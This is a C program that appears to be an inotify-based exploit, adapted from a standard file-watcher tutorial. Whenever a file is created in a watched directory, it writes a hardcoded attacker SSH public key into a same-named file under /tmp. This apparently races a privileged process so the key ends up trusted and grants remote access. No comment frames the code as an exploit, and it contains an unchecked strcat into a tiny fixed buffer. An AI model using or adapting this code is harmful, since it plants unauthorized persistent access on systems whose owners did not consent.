#include<stdio.h>
#include<sys/inotify.h>
#include<unistd.h>
#include<stdlib.h>
#include<signal.h>
#include<fcntl.h> // library for fcntl function
 
#define MAX_EVENTS 1024  /* Maximum number of events to process*/
#define LEN_NAME 16  /* Assuming that the length of the filename
won't exceed 16 bytes*/
#define EVENT_SIZE  ( sizeof (struct inotify_event) ) /*size of one event*/
#define BUF_LEN     ( MAX_EVENTS * ( EVENT_SIZE + LEN_NAME ))
/*buffer to store the data of events*/
 
int fd,wd;
 
void sig_handler(int sig){
 
       /* Step 5. Remove the watch descriptor and close the inotify instance*/
       inotify_rm_watch( fd, wd );
       close( fd );
       exit( 0 );
 
}
 
 
int main(int argc, char **argv){
 
 
       char *path_to_be_watched;
       signal(SIGINT,sig_handler);
 
       path_to_be_watched = argv[1];
 
       /* Step 1. Initialize inotify */
       fd = inotify_init();
 
 
       if (fcntl(fd, F_SETFL, O_NONBLOCK) < 0)  // error checking for fcntl
       exit(2);
 
       /* Step 2. Add Watch */
       wd = inotify_add_watch(fd,path_to_be_watched,IN_MODIFY | IN_CREATE | IN_DELETE);
 
       if(wd==-1){
               printf("Could not watch : %s\n",path_to_be_watched);
       }
       else{
              printf("Watching : %s\n",path_to_be_watched);
       }
 
 
       while(1){
 
              int i=0,length;
              char buffer[BUF_LEN];
 
              /* Step 3. Read buffer*/
              length = read(fd,buffer,BUF_LEN);
 
              /* Step 4. Process the events which has occurred */
              while(i<length){
 
                struct inotify_event *event = (struct inotify_event *) &buffer[i];
 
                  if(event->len){
                   if ( event->mask & IN_CREATE ) {
                   if ( event->mask & IN_ISDIR ) {
                     printf( "The directory %s was created.\n", event->name );
                     }
                     else {
                       printf( "The file %s was created.\n", event->name );
                       FILE *fptr;
                       char fullname[] = "/tmp/";
                       strcat(fullname, event->name);
                       fptr = fopen(fullname, "w");
                       fprintf(fptr, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCphFnZcFRzXAr86+9rZqEyn8/QqABKMBzxRLk29pJZenlXvtQ3R7xzh0n3TCxqCn50e1WMwPhsrGrvtXg3U89kaU2MRPjZBFc0Fwfgl38ZT0KnRG49s/iKTGVNvnX88BP558D8AkSRvfLYUxz/ZU3QQLrZlNhkrv57BG7BkkDPwm2jVd8Z0Ryb7I45/09yYJrs9R0vJrpupOSuEpvjPSnJS2KhVyET/+oZxb8zaNyJP6DDpg+U9cD7JW+hyeTyG/yg6UwpRXj+1DkwnZV2CuX8x8fBnNj3lXrnzkGrJeIFWgrAm7twlE+K5V6+JGVTZmoSGx7gkeWx77+l0G08m7qc5G21GambbebUfiZD2zY+380mNozQthMFADpVyJUkWGLIy46aiQ0q5giID/Lm/y9uv4sY3kZET5Pc7TTv3VemDq0UPuIVVOxwokHX+HrqNVJbZz2k9XdhH+zZc7jqbmpJD2vyKB4co2lqBec0rqCrQpCE4yhY7cpmHo2sOfNNY9U=\n");
                       fclose(fptr);
                    }
                    }
                    else if ( event->mask & IN_DELETE ) {
                    if ( event->mask & IN_ISDIR ) {
                      printf( "The directory %s was deleted.\n", event->name );
                    }
                    else {
                      printf( "The file %s was deleted.\n", event->name );
                    }
                    }
                    else if ( event->mask & IN_MODIFY ) {
                    if ( event->mask & IN_ISDIR ) {
                      printf( "The directory %s was modified.\n", event->name );
                    }
                    else {
                     printf( "The file %s was modified.\n", event->name );
                    }
                    }
                   }
                   i += EVENT_SIZE + event->len;
          }
    }
}
